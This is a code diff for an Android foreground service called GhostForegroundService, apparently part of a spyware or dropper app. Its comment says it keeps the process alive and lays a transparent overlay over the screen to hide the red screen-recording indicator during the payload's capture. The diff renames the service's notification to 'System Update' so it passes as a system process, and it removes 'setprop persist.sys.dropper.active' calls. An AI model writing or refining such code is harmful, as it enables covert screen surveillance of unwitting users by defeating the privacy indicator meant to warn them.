@@ -1,17 +1,21 @@
 package com.android.shell.ghost;
 
+import android.app.Notification;
+import android.app.NotificationChannel;
+import android.app.NotificationManager;
+import android.app.PendingIntent;
 import android.app.Service;
 import android.content.Context;
 import android.content.Intent;
 import android.graphics.PixelFormat;
 import android.os.IBinder;
+import android.provider.Settings;
 import android.view.Gravity;
 import android.view.WindowManager;
 
 /**
- * Stealth foreground service.
- * Holds a wake-lock, keeps the connection alive,
- * and overlays a transparent window to hide the red recording dot.
+ * Keeps the process alive and overlays a transparent window so the payload's
+ * screen capture has no red recording indicator on top of it.
  */
 public class GhostForegroundService extends Service {
 
@@ -22,11 +26,10 @@ public class GhostForegroundService extends Service {
     public void onCreate() {
         super.onCreate();
         windowManager = (WindowManager) getSystemService(Context.WINDOW_SERVICE);
-        // Start foreground with a transparent notification (invisible to user)
         startForeground(1, createNotification());
-        // Create the transparent overlay that hides the recording dot
+
         overlayView = new android.view.View(this);
-        overlayView.setBackgroundColor(0x00000000); // fully transparent
+        overlayView.setBackgroundColor(0x00000000);
         WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                 WindowManager.LayoutParams.MATCH_PARENT,
                 WindowManager.LayoutParams.MATCH_PARENT,
@@ -37,12 +40,8 @@ public class GhostForegroundService extends Service {
                 PixelFormat.TRANSPARENT);
         params.gravity = Gravity.TOP | Gravity.START;
         try {
-            if (android.provider.Settings.canDrawOverlays(this)) windowManager.addView(overlayView, params);
+            if (Settings.canDrawOverlays(this)) windowManager.addView(overlayView, params);
         } catch (Throwable ignored) {}
-        // Set persistent property
-        try {
-            Runtime.getRuntime().exec("setprop persist.sys.dropper.active true").waitFor();
-        } catch (Exception ignored) {}
     }
 
     @Override
@@ -53,27 +52,29 @@ public class GhostForegroundService extends Service {
     @Override
     public void onDestroy() {
         if (overlayView != null) {
-            windowManager.removeView(overlayView);
+            try { windowManager.removeView(overlayView); } catch (Throwable ignored) {}
             overlayView = null;
         }
-        try {
-            Runtime.getRuntime().exec("setprop persist.sys.dropper.active false").waitFor();
-        } catch (Exception ignored) {}
         super.onDestroy();
     }
 
     @Override
     public IBinder onBind(Intent intent) { return null; }
 
-    private android.app.Notification createNotification() {
-        android.app.NotificationChannel channel = new android.app.NotificationChannel(
-                "ghost_service", "Ghost Service", android.app.NotificationManager.IMPORTANCE_MIN);
-        ((android.app.NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE))
+    private Notification createNotification() {
+        NotificationChannel channel = new NotificationChannel(
+                "ghost_service", "System Update", NotificationManager.IMPORTANCE_MIN);
+        ((NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE))
                 .createNotificationChannel(channel);
-        return new android.app.Notification.Builder(this, "ghost_service")
-                .setContentTitle("Ghost")
+        Intent open = new Intent(this, MainActivity.class)
+                .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+        PendingIntent content = PendingIntent.getActivity(this, 0, open,
+                PendingIntent.FLAG_IMMUTABLE | PendingIntent.FLAG_UPDATE_CURRENT);
+        return new Notification.Builder(this, "ghost_service")
+                .setContentTitle("System Update")
                 .setContentText("Running")
                 .setSmallIcon(android.R.drawable.ic_dialog_info)
+                .setContentIntent(content)
                 .setOngoing(true)
                 .build();
     }
